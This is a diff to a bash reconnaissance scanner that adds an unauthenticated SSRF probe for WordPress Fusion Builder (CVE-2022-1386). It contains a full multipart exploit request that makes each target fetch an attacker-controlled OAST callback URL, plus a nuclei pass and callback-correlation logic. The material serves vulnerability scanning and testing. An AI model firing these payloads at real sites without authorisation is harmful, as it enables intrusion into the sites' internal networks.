@@ -123,6 +123,108 @@ function xss() {
 
 }
 
+# Probe WordPress Fusion Builder unauth SSRF (CVE-2022-1386).
+# POST /wp-admin/admin-ajax.php with fusionAction pointing at our OAST callback.
+_ssrf_probe_cve_2022_1386() {
+    local hosts_file="" base_url ajax_url token oast_url nonce boundary resp body
+    local max_hosts=50
+    local probed=0
+
+    [[ -n "${COLLAB_SERVER_URL:-}" || -n "${COLLAB_SERVER_FIX:-}" ]] || return 0
+    command -v curl >/dev/null 2>&1 || return 0
+
+    if [[ -s "webs/webs_all.txt" ]]; then
+        hosts_file="webs/webs_all.txt"
+    elif [[ -s "webs/webs.txt" ]]; then
+        hosts_file="webs/webs.txt"
+    else
+        return 0
+    fi
+
+    # Prefer WordPress-looking hosts when available.
+    : >".tmp/ssrf_cve1386_hosts.txt"
+    [[ -s ".tmp/wp_brute_targets.txt" ]] && cat ".tmp/wp_brute_targets.txt" >>".tmp/ssrf_cve1386_hosts.txt"
+    [[ -s ".tmp/wp_brute_targets_all.txt" ]] && cat ".tmp/wp_brute_targets_all.txt" >>".tmp/ssrf_cve1386_hosts.txt"
+    grep -aiE 'wordpress|wp-login|xmlrpc|fusion-builder|fusion_builder|\[CVE-2022-1386\]' \
+        nuclei_output/*.txt 2>/dev/null \
+        | grep -aoE 'https?://[^[:space:]"]+' \
+        | sed -E 's|[/\?#].*$||' >>".tmp/ssrf_cve1386_hosts.txt" 2>/dev/null || true
+
+    # Always include general webs as fallback (capped).
+    cat "$hosts_file" >>".tmp/ssrf_cve1386_hosts.txt"
+    awk 'NF {
+        u=$0
+        sub(/\/$/, "", u)
+        if (match(u, /^https?:\/\/[^\/?#]+/)) print substr(u, RSTART, RLENGTH)
+    }' ".tmp/ssrf_cve1386_hosts.txt" | sort -u >".tmp/ssrf_cve1386_hosts_norm.txt"
+
+    if [[ $DEEP != true ]]; then
+        local hc
+        hc=$(wc -l <".tmp/ssrf_cve1386_hosts_norm.txt" | tr -d ' ')
+        if [[ "$hc" -gt "$max_hosts" ]]; then
+            head -n "$max_hosts" ".tmp/ssrf_cve1386_hosts_norm.txt" >".tmp/ssrf_cve1386_hosts_cap.txt"
+            mv ".tmp/ssrf_cve1386_hosts_cap.txt" ".tmp/ssrf_cve1386_hosts_norm.txt"
+        fi
+    fi
+
+    [[ -s ".tmp/ssrf_cve1386_hosts_norm.txt" ]] || return 0
+
+    : >".tmp/ssrf_cve1386_map.tsv"
+    : >"vulns/ssrf_cve_2022_1386.txt"
+    _print_msg INFO "Running: CVE-2022-1386 Fusion Builder SSRF probe ($(wc -l <".tmp/ssrf_cve1386_hosts_norm.txt" | tr -d ' ') host(s))"
+
+    local oast_host
+    oast_host=$(printf '%s' "${COLLAB_SERVER_FIX:-${COLLAB_SERVER_URL}}" | sed -E 's#^https?://##; s#^FFUFHASH\.##')
+    [[ -z "$oast_host" ]] && return 0
+
+    while IFS= read -r base_url || [[ -n "$base_url" ]]; do
+        [[ -z "$base_url" ]] && continue
+        ajax_url="${base_url%/}/wp-admin/admin-ajax.php"
+        token="cve1386$(_hash_string "$base_url" | cut -c1-8)"
+        oast_url="http://${token}.${oast_host}"
+        printf '%s\t%s\n' "$token" "$ajax_url" >>".tmp/ssrf_cve1386_map.tsv"
+
+        # Step 1: try to fetch a fusion form nonce (same as nuclei template).
+        nonce="0"
+        resp=$(run_command curl -sk -m 12 -X POST "$ajax_url" \
+            -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
+            -H "${HEADER}" \
+            --data "action=fusion_form_update_view" 2>/dev/null || true)
+        if [[ -n "$resp" ]]; then
+            nonce=$(printf '%s' "$resp" | grep -aoE 'fusion-form-nonce-0"[^>]*value="[^"]+"' \
+                | head -1 | sed -E 's/.*value="//; s/"$//' || true)
+            [[ -z "$nonce" ]] && nonce=$(printf '%s' "$resp" | grep -aoE 'id="fusion-form-nonce-0" value="[^"]+"' \
+                | head -1 | sed -E 's/.*value="//; s/"$//' || true)
+            [[ -z "$nonce" ]] && nonce="0"
+        fi
+
+        boundary="---------------------------reconftw1386${token}"
+        body=$(printf -- '--%s\r\nContent-Disposition: form-data; name="formData"\r\n\r\nemail=recon%%40example.com&fusion_privacy_store_ip_ua=false&fusion_privacy_expiration_interval=48&privacy_expiration_action=ignore&fusion-form-nonce-0=%s&fusion-fields-hold-private-data=\r\n--%s\r\nContent-Disposition: form-data; name="action"\r\n\r\nfusion_form_submit_form_to_url\r\n--%s\r\nContent-Disposition: form-data; name="fusion_form_nonce"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="form_id"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="post_id"\r\n\r\n0\r\n--%s\r\nContent-Disposition: form-data; name="field_labels"\r\n\r\n{"email":"Email address"}\r\n--%s\r\nContent-Disposition: form-data; name="hidden_field_names"\r\n\r\n[]\r\n--%s\r\nContent-Disposition: form-data; name="fusionAction"\r\n\r\n%s\r\n--%s\r\nContent-Disposition: form-data; name="fusionActionMethod"\r\n\r\nGET\r\n--%s--\r\n' \
+            "$boundary" "$nonce" "$boundary" "$boundary" "$nonce" "$boundary" "$boundary" "$boundary" "$boundary" "$boundary" "$oast_url" "$boundary" "$boundary")
+
+        resp=$(run_command curl -sk -m 15 -X POST "$ajax_url" \
+            -H "Content-Type: multipart/form-data; boundary=${boundary}" \
+            -H "X-Requested-With: XMLHttpRequest" \
+            -H "${HEADER}" \
+            --data-binary "$body" 2>/dev/null || true)
+
+        probed=$((probed + 1))
+        if printf '%s' "$resp" | grep -aiqE 'Interactsh Server|oast\.|"status"\s*:\s*"success"'; then
+            printf '%s | CVE-2022-1386 | reflected/success response | fusionAction=%s\n' \
+                "$ajax_url" "$oast_url" | anew -q "vulns/ssrf_cve_2022_1386.txt"
+        else
+            printf '%s | CVE-2022-1386 | probed | fusionAction=%s | token=%s\n' \
+                "$ajax_url" "$oast_url" "$token" >>".tmp/ssrf_cve1386_probed.txt"
+        fi
+    done <".tmp/ssrf_cve1386_hosts_norm.txt"
+
+    if [[ -s "vulns/ssrf_cve_2022_1386.txt" ]]; then
+        notification "SSRF: CVE-2022-1386 candidate(s) in vulns/ssrf_cve_2022_1386.txt" warn
+    else
+        _print_msg INFO "CVE-2022-1386 probe finished (${probed} host(s); awaiting OOB correlation if any)"
+    fi
+}
+
 function ssrf_checks() {
 
     # Create necessary directories
@@ -270,13 +372,33 @@ function ssrf_checks() {
                 fi
             fi
 
+            # WordPress Fusion Builder unauth SSRF (CVE-2022-1386): POST /wp-admin/admin-ajax.php
+            # with action=fusion_form_submit_form_to_url + fusionAction=<url>. Missed by GET/ffuf
+            # qsreplace flows because the sink is a POST multipart field, not a query param.
+            _ssrf_probe_cve_2022_1386
+
             # Nuclei SSRF/OAST template pass — covers IMDSv2, blind-SSRF via OAST,
-            # and cloud-metadata templates that ffuf+qsreplace miss.
+            # and cloud-metadata templates that ffuf+qsreplace miss. Also run the
+            # Fusion Builder CVE template against live webs (not only gf/ssrf.txt).
             if command -v nuclei &>/dev/null && [[ -d "${NUCLEI_TEMPLATES_PATH:-}" ]]; then
                 _print_msg INFO "Running: Nuclei SSRF/OAST template scan"
                 run_command nuclei -l "gf/ssrf.txt" -tags ssrf,oast -nh \
                     -rl "$NUCLEI_RATELIMIT" -silent -retries 2 ${NUCLEI_EXTRA_ARGS} \
                     -j -o "vulns/ssrf_nuclei_json.txt" 2>>"$LOGFILE" >/dev/null || true
+
+                if [[ -s "webs/webs_all.txt" || -s "webs/webs.txt" ]]; then
+                    cat webs/webs_all.txt webs/webs.txt 2>/dev/null | sed '/^$/d' | sort -u >".tmp/ssrf_nuclei_webs.txt"
+                    _print_msg INFO "Running: Nuclei CVE-2022-1386 (Fusion Builder SSRF) against web roots"
+                    run_command nuclei -l ".tmp/ssrf_nuclei_webs.txt" -id CVE-2022-1386 -nh \
+                        -rl "$NUCLEI_RATELIMIT" -silent -retries 2 ${NUCLEI_EXTRA_ARGS} \
+                        -j -o ".tmp/ssrf_cve_2022_1386_nuclei.json" 2>>"$LOGFILE" >/dev/null || true
+                    if [[ -s ".tmp/ssrf_cve_2022_1386_nuclei.json" ]]; then
+                        cat ".tmp/ssrf_cve_2022_1386_nuclei.json" | anew -q "vulns/ssrf_nuclei_json.txt"
+                        jq -r '["[" + .["template-id"] + "] [" + .["type"] + "] [" + .info.severity + "] " + (.["matched-at"] // .host)] | .[]' \
+                            ".tmp/ssrf_cve_2022_1386_nuclei.json" 2>/dev/null \
+                            | anew -q "vulns/ssrf_cve_2022_1386.txt"
+                    fi
+                fi
             fi
 
             # Allow time for OOB/DNS callbacks to be received.
@@ -285,11 +407,22 @@ function ssrf_checks() {
 
             # Process SSRF callback results if INTERACT is enabled.
             if [[ $INTERACT == true ]] && [[ -s ".tmp/ssrf_callback.txt" ]]; then
-                tail -n +11 .tmp/ssrf_callback.txt | anew -q "vulns/ssrf_callback.txt"
-                if ! NUMOFLINES=$(tail -n +12 .tmp/ssrf_callback.txt | sed '/^$/d' | wc -l); then
-                    NUMOFLINES=0
-                fi
-                notification "SSRF: ${NUMOFLINES} callbacks received" info
+                # Keep human-readable banner lines for debugging, but count ONLY real
+                # interactsh -json interaction records. Previously we did
+                # `tail -n +12 | wc -l`, which counted the OAST domain announcement as
+                # a "callback" and wrote an empty-looking ssrf_confirmed.txt header.
+                grep -aE '^\{' ".tmp/ssrf_callback.txt" 2>/dev/null | anew -q "vulns/ssrf_callback.txt" || true
+                NUMOFLINES=$(grep -acE '^\{' ".tmp/ssrf_callback.txt" 2>/dev/null || echo 0)
+                [[ -z "$NUMOFLINES" ]] && NUMOFLINES=0
+                notification "SSRF: ${NUMOFLINES} OOB interaction(s) received" info
+
+                {
+                    printf '# SSRF OOB confirmed findings\n'
+                    printf '# Meaning: interactsh received a callback whose full-id embeds an ffuf request hash.\n'
+                    printf '# That proves something on the request path resolved/fetched our OAST domain.\n'
+                    printf '# It does NOT always identify the single sink parameter (qsreplace may replace all params).\n'
+                    printf '# Format: url | method | vector | hash | oob_protocol | note\n'
+                } >"vulns/ssrf_confirmed.txt"
 
                 # Correlate each OOB hit back to the exact request that triggered it,
                 # using ffuf's built-in FFUFHASH history mapping (`ffuf -search <hash>`,
@@ -307,13 +440,6 @@ function ssrf_checks() {
                 # `ffuf -search` to reconstruct the original request (URL/host/header).
                 if [[ "$NUMOFLINES" -gt 0 ]] && command -v ffuf &>/dev/null && command -v jq &>/dev/null; then
                     _print_msg INFO "Running: Correlating OOB callbacks to source requests (ffuf -search)"
-                    {
-                        printf '# SSRF OOB confirmed findings\n'
-                        printf '# Meaning: interactsh received a callback whose full-id embeds an ffuf request hash.\n'
-                        printf '# That proves something on the request path resolved/fetched our OAST domain.\n'
-                        printf '# It does NOT always identify the single sink parameter (qsreplace may replace all params).\n'
-                        printf '# Format: url | method | vector | hash | oob_protocol | note\n'
-                    } >"vulns/ssrf_confirmed.txt"
 
                     # Only keep full-ids that look like "<ffufhash>.<interactsh-id>" (skip bare interactsh probes).
                     jq -R -r 'fromjson? | select((."full-id" // "") | test("^[A-Za-z0-9]{6,}\\.")) | [."full-id", (."protocol" // "unknown")] | @tsv' \
@@ -325,37 +451,78 @@ function ssrf_checks() {
                         while IFS= read -r _ssrf_hash; do
                             [[ -z "$_ssrf_hash" ]] && continue
                             _ssrf_req=$(ffuf -search "$_ssrf_hash" 2>/dev/null)
-                            [[ -z "$_ssrf_req" ]] && continue
-                            _ssrf_host=$(grep -aim1 '^Host:' <<<"$_ssrf_req" | sed 's/^[Hh]ost:[[:space:]]*//' | tr -d '\r')
-                            _ssrf_method=$(grep -aoE '^(GET|POST|PUT|HEAD|PATCH|DELETE) ' <<<"$_ssrf_req" | head -1 | tr -d ' ')
-                            _ssrf_path=$(grep -aoE '^(GET|POST|PUT|HEAD|PATCH|DELETE) [^ ]+' <<<"$_ssrf_req" | head -1 | awk '{print $2}')
-                            [[ -z "$_ssrf_host" || -z "$_ssrf_path" ]] && continue
-                            [[ -z "$_ssrf_method" ]] && _ssrf_method="GET"
+                            _ssrf_host=""
+                            _ssrf_method="GET"
+                            _ssrf_path=""
+                            _ssrf_hdr=""
+                            _ssrf_vector="unknown"
+                            _ssrf_note=""
 
-                            # Real injected HTTP header only (ignore ffuf -search meta lines).
-                            _ssrf_hdr=$(grep -aiE "^[A-Za-z0-9-]+:.*${_ssrf_hash}" <<<"$_ssrf_req" | grep -aivE '^(Host|GET|POST|PUT|HEAD|PATCH|DELETE)[: ]' | head -1 | cut -d: -f1)
+                            if [[ -n "$_ssrf_req" ]]; then
+                                _ssrf_host=$(grep -aim1 '^Host:' <<<"$_ssrf_req" | sed 's/^[Hh]ost:[[:space:]]*//' | tr -d '\r')
+                                _ssrf_method=$(grep -aoE '^(GET|POST|PUT|HEAD|PATCH|DELETE) ' <<<"$_ssrf_req" | head -1 | tr -d ' ')
+                                _ssrf_path=$(grep -aoE '^(GET|POST|PUT|HEAD|PATCH|DELETE) [^ ]+' <<<"$_ssrf_req" | head -1 | awk '{print $2}')
+                                [[ -z "$_ssrf_method" ]] && _ssrf_method="GET"
+                                _ssrf_hdr=$(grep -aiE "^[A-Za-z0-9-]+:.*${_ssrf_hash}" <<<"$_ssrf_req" | grep -aivE '^(Host|GET|POST|PUT|HEAD|PATCH|DELETE)[: ]' | head -1 | cut -d: -f1)
+                            fi
+
+                            # CVE-2022-1386 probes use custom tokens (cve1386********), not ffuf hashes.
+                            if [[ -z "$_ssrf_host" || -z "$_ssrf_path" ]] && [[ -s ".tmp/ssrf_cve1386_map.tsv" ]]; then
+                                _ssrf_mapped=$(awk -F'\t' -v h="$_ssrf_hash" 'tolower($1)==tolower(h) {print $2; exit}' ".tmp/ssrf_cve1386_map.tsv" 2>/dev/null)
+                                if [[ -n "$_ssrf_mapped" ]]; then
+                                    _ssrf_method="POST"
+                                    _ssrf_path="$_ssrf_mapped"
+                                    _ssrf_host=$(printf '%s' "$_ssrf_mapped" | sed -E 's#^https?://([^/]+)/.*#\1#')
+                                    _ssrf_vector="cve-2022-1386:fusionAction"
+                                    _ssrf_note="OAST callback matched CVE-2022-1386 Fusion Builder probe token"
+                                fi
+                            fi
+
+                            [[ -z "$_ssrf_host" || -z "$_ssrf_path" ]] && continue
+
                             _ssrf_proto=$(awk -F'\t' -v h="$_ssrf_hash" 'index($1,h)==1 {print $2; exit}' ".tmp/ssrf_hit_map.tsv" 2>/dev/null)
                             [[ -z "$_ssrf_proto" ]] && _ssrf_proto="unknown"
 
-                            if [[ -n "$_ssrf_hdr" ]]; then
-                                _ssrf_vector="header:${_ssrf_hdr}"
-                                _ssrf_note="OAST ${_ssrf_proto} callback matched ffuf hash in header ${_ssrf_hdr}"
-                            elif [[ "$_ssrf_path" == *"$_ssrf_hash"* ]]; then
-                                _ssrf_vector="url-query"
-                                _ssrf_note="OAST ${_ssrf_proto} callback matched ffuf hash in URL (all qsreplace params may contain payload; sink param unknown)"
-                            else
-                                _ssrf_vector="unknown"
-                                _ssrf_note="OAST ${_ssrf_proto} callback matched ffuf hash; request reconstructed but hash location unclear"
+                            if [[ -z "$_ssrf_note" ]]; then
+                                if [[ -n "$_ssrf_hdr" ]]; then
+                                    _ssrf_vector="header:${_ssrf_hdr}"
+                                    _ssrf_note="OAST ${_ssrf_proto} callback matched ffuf hash in header ${_ssrf_hdr}"
+                                elif [[ "$_ssrf_path" == *"$_ssrf_hash"* ]]; then
+                                    _ssrf_vector="url-query"
+                                    _ssrf_note="OAST ${_ssrf_proto} callback matched ffuf hash in URL (all qsreplace params may contain payload; sink param unknown)"
+                                else
+                                    _ssrf_vector="unknown"
+                                    _ssrf_note="OAST ${_ssrf_proto} callback matched ffuf hash; request reconstructed but hash location unclear"
+                                fi
                             fi
 
-                            printf 'https://%s%s | %s | %s | hash=%s | oob=%s | %s\n' \
-                                "$_ssrf_host" "$_ssrf_path" "$_ssrf_method" "$_ssrf_vector" "$_ssrf_hash" "$_ssrf_proto" "$_ssrf_note"
+                            if [[ "$_ssrf_path" == http* ]]; then
+                                printf '%s | %s | %s | hash=%s | oob=%s | %s\n' \
+                                    "$_ssrf_path" "$_ssrf_method" "$_ssrf_vector" "$_ssrf_hash" "$_ssrf_proto" "$_ssrf_note"
+                            else
+                                printf 'https://%s%s | %s | %s | hash=%s | oob=%s | %s\n' \
+                                    "$_ssrf_host" "$_ssrf_path" "$_ssrf_method" "$_ssrf_vector" "$_ssrf_hash" "$_ssrf_proto" "$_ssrf_note"
+                            fi
                         done <".tmp/ssrf_hit_hashes.txt" | anew -q "vulns/ssrf_confirmed.txt"
                     fi
+                fi
 
-                    if grep -qE '^https?://' "vulns/ssrf_confirmed.txt" 2>/dev/null; then
-                        notification "SSRF: $(grep -cE '^https?://' "vulns/ssrf_confirmed.txt") CONFIRMED OOB finding(s) - see vulns/ssrf_confirmed.txt" warn
-                    fi
+                # Also promote reflected CVE-2022-1386 hits into confirmed when present.
+                if [[ -s "vulns/ssrf_cve_2022_1386.txt" ]]; then
+                    grep -a 'reflected/success' "vulns/ssrf_cve_2022_1386.txt" 2>/dev/null \
+                        | while IFS= read -r _cve_line; do
+                            _cve_url=$(printf '%s' "$_cve_line" | awk -F' | ' '{print $1}')
+                            [[ -z "$_cve_url" ]] && continue
+                            printf '%s | POST | cve-2022-1386:fusionAction | hash=n/a | oob=reflected | Fusion Builder SSRF reflected Interactsh/OAST content\n' \
+                                "$_cve_url"
+                        done | anew -q "vulns/ssrf_confirmed.txt"
+                fi
+
+                if grep -qE '^https?://' "vulns/ssrf_confirmed.txt" 2>/dev/null; then
+                    notification "SSRF: $(grep -cE '^https?://' "vulns/ssrf_confirmed.txt") CONFIRMED OOB finding(s) - see vulns/ssrf_confirmed.txt" warn
+                else
+                    printf 'RESULT: NO OOB-confirmed SSRF (interactions=%s; correlated_urls=0)\n' "$NUMOFLINES" >>"vulns/ssrf_confirmed.txt"
+                    _print_msg INFO "SSRF: no OOB-confirmed findings (see vulns/ssrf_confirmed.txt)"
                 fi
             fi
 
